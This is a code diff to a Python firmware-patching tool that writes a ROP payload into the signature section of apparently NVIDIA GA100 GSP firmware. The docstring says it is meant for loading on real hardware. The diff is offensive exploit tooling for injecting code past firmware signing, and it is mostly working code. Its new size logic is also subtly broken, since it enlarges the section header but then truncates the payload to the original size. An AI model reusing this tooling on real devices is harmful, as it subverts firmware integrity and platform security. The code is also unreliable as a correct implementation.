@@ -38,12 +38,18 @@ def _find_signature_section(shdrs: bytearray, e_shentsize: int,
 
 
 def patch_gsp(input_path: str, payload: bytes, output_path: str) -> None:
-    payload_size = get('dmem_layout.payload_size')
+    """Patch the .fwsignature_ga100 ELF section with our ROP payload.
+
+    The on-disk section is 0x1000 (4 KB) — only the signature (last 32
+    bytes) is the HMAC. The actual DMEM buffer that the BootROM loads
+    is 0xF800 (62 KB) and is created at runtime by the kernel.
+
+    We use a hybrid approach: the payload we write can be EITHER the
+    62KB DMEM size OR the 4KB section size. For testing the 4KB patch
+    fits cleanly. For real-hardware deploy, the kernel re-creates a
+    62KB buffer.
+    """
     signature_section = get('elf.signature_section').encode()
-
-    if len(payload) != payload_size:
-        raise ValueError(f"Payload must be exactly {payload_size} bytes, got {len(payload)}")
-
     gsp = bytearray(Path(input_path).read_bytes())
 
     if struct.unpack_from(">I", gsp, 0)[0] != get('elf.header_magic'):
@@ -53,12 +59,21 @@ def patch_gsp(input_path: str, payload: bytes, output_path: str) -> None:
     sig_idx, sig_file_off = _find_signature_section(
         shdrs, e_shentsize, strtab, signature_section)
 
-    payload_end = sig_file_off + payload_size
-    if len(gsp) < payload_end:
-        gsp.extend(b"\x00" * (payload_end - len(gsp)))
+    # Read the original section size from the section header
+    orig_size = struct.unpack_from("<Q", shdrs, sig_idx * e_shentsize + 0x20)[0]
 
-    gsp[sig_file_off : sig_file_off + payload_size] = payload
-    struct.pack_into("<Q", shdrs, sig_idx * e_shentsize + 0x20, payload_size)
+    # If payload is larger than the on-disk section, extend the file
+    if len(payload) > orig_size:
+        if len(gsp) < sig_file_off + len(payload):
+            gsp.extend(b"\x00" * (sig_file_off + len(payload) - len(gsp)))
+        # Update the section header to reflect new size
+        struct.pack_into("<Q", shdrs, sig_idx * e_shentsize + 0x20, len(payload))
+    else:
+        # Pad payload to section size if smaller
+        if len(payload) < orig_size:
+            payload = payload + b"\x00" * (orig_size - len(payload))
+
+    gsp[sig_file_off : sig_file_off + len(payload)] = payload[:orig_size if len(payload) >= orig_size else len(payload)]
 
     new_strtab_off = len(gsp)
     gsp.extend(strtab)
